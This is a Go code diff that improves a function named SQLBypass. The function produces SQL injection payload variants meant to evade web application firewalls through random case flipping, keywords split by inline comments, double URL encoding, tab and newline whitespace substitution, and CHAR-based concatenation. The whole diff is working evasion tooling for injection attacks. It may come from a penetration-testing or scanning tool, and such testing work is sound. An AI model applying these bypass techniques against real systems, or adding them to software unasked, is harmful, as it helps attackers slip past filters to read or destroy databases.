@@ -27,7 +27,7 @@ func SQLBypass(payload string) []string {
 	variants = append(variants, doubleURLEncode(payload))
 
 	// Whitespace substitution: use tabs, /**/, %0a instead of spaces.
-	variants = append(variants, whitespaceSubstitute(payload))
+	variants = append(variants, whitespaceSubstitutes(payload)...)
 
 	// Concat-based bypass: CONCAT(char(83),char(69),char(76),char(69),char(67),char(84)).
 	if strings.Contains(strings.ToUpper(payload), "SELECT") {
@@ -189,35 +189,75 @@ func urlEncodeBraces(s string) string {
 // --- Helper functions ---
 
 func randomCase(s string) string {
-	var b strings.Builder
-	for _, c := range s {
+	runes := []rune(s)
+	flipped := false
+	for i, c := range runes {
+		upper := []rune(strings.ToUpper(string(c)))
+		lower := []rune(strings.ToLower(string(c)))
+		if upper[0] == lower[0] {
+			continue // not a letter, skip
+		}
 		if rand.IntN(2) == 0 {
-			b.WriteRune(c)
-		} else {
-			upper := strings.ToUpper(string(c))
-			lower := strings.ToLower(string(c))
-			if string(c) == upper {
-				b.WriteString(lower)
+			if c == upper[0] {
+				runes[i] = lower[0]
 			} else {
-				b.WriteString(upper)
+				runes[i] = upper[0]
+			}
+			flipped = true
+		}
+	}
+	// Guarantee at least one case change — flip the first letter if needed.
+	if !flipped {
+		for i, c := range runes {
+			upper := []rune(strings.ToUpper(string(c)))
+			lower := []rune(strings.ToLower(string(c)))
+			if upper[0] != lower[0] {
+				if c == upper[0] {
+					runes[i] = lower[0]
+				} else {
+					runes[i] = upper[0]
+				}
+				break
 			}
 		}
 	}
-	return b.String()
+	return string(runes)
 }
 
 func inlineComments(s string) string {
 	keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP"}
 	result := s
 	for _, kw := range keywords {
-		// Split the keyword in half and insert a comment.
-		if len(kw) > 2 {
-			mid := len(kw) / 2
-			replacement := kw[:mid] + "/**/" + kw[mid:]
-			result = strings.ReplaceAll(strings.ToUpper(result), kw, replacement)
+		if len(kw) <= 2 {
+			continue
 		}
+		mid := len(kw) / 2
+		replacement := kw[:mid] + "/**/" + kw[mid:]
+		// Case-insensitive replace: find keyword positions without uppercasing
+		// the entire string (which would destroy table/column names).
+		result = replaceIgnoreCase(result, kw, replacement)
 	}
 	return result
+}
+
+// replaceIgnoreCase replaces all case-insensitive occurrences of old with new_
+// without modifying the case of surrounding text.
+func replaceIgnoreCase(s, old, new_ string) string {
+	upper := strings.ToUpper(s)
+	oldUpper := strings.ToUpper(old)
+	var b strings.Builder
+	pos := 0
+	for {
+		idx := strings.Index(upper[pos:], oldUpper)
+		if idx < 0 {
+			b.WriteString(s[pos:])
+			break
+		}
+		b.WriteString(s[pos : pos+idx])
+		b.WriteString(new_)
+		pos += idx + len(old)
+	}
+	return b.String()
 }
 
 func urlEncodeKeywords(s string) string {
@@ -233,16 +273,22 @@ func urlEncodeKeywords(s string) string {
 }
 
 func doubleURLEncode(s string) string {
-	// First pass: URL encode.
-	first := url.QueryEscape(s)
-	// Second pass: encode the % signs.
-	return strings.ReplaceAll(first, "%", "%25")
+	// First pass: percent-encode every byte (not QueryEscape, which uses + for spaces).
+	var first strings.Builder
+	for i := 0; i < len(s); i++ {
+		first.WriteString(fmt.Sprintf("%%%02X", s[i]))
+	}
+	// Second pass: encode the % signs from the first pass.
+	return strings.ReplaceAll(first.String(), "%", "%25")
 }
 
-func whitespaceSubstitute(s string) string {
+func whitespaceSubstitutes(s string) []string {
 	replacements := []string{"/**/", "%09", "%0a", "%0d"}
-	r := replacements[rand.IntN(len(replacements))]
-	return strings.ReplaceAll(s, " ", r)
+	variants := make([]string, len(replacements))
+	for i, r := range replacements {
+		variants[i] = strings.ReplaceAll(s, " ", r)
+	}
+	return variants
 }
 
 func charConcat(s string) string {
